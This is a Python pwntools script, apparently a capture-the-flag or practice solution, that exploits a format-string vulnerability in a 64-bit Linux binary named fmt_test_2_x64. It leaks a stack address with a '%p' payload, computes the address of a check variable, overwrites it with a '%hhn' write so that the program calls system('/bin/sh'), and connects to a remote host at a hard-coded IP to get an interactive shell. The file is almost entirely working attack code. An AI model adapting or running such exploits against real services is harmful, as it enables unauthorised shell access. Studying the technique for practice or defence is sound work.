'''
@Author       : 白银
@Date         : 2023-01-31 09:48:55
@LastEditors  : 白银
@LastEditTime : 2023-02-09 09:44:01
@FilePath     : /pwn/fmt_test_2_x64.py
@Description  : 
@Attention    : 
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *

set_arch = 0

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './fmt_test_2_x64'
state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.139", 8888)
    # io = remote("129.226.211.132", 8888)
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

io.recvline()
payload_search_stack = b'%14$p'#从R12的_start开始数，rbp是第14个，x64里面rsp是第6个参数
io.sendline(payload_search_stack)

stack_1 = int(io.recv()[2:14], 16)# debug返回的0xf bytes，截取0x之后\n之前
test3_addr = stack_1 - 0x18 #源码中，是if(test3==100) system("/bin/sh")，所以比较test3的地址
# print("stack is: ", hex(stack_1))
payload = b'%100c%12$hhnaaaa' + p64(test3_addr)
io.send(payload)

# if state == 0:
#     io.sendline(payload)  # 远程用
# else:
#     io.sendlineafter(payload)  # 本地用

io.interactive()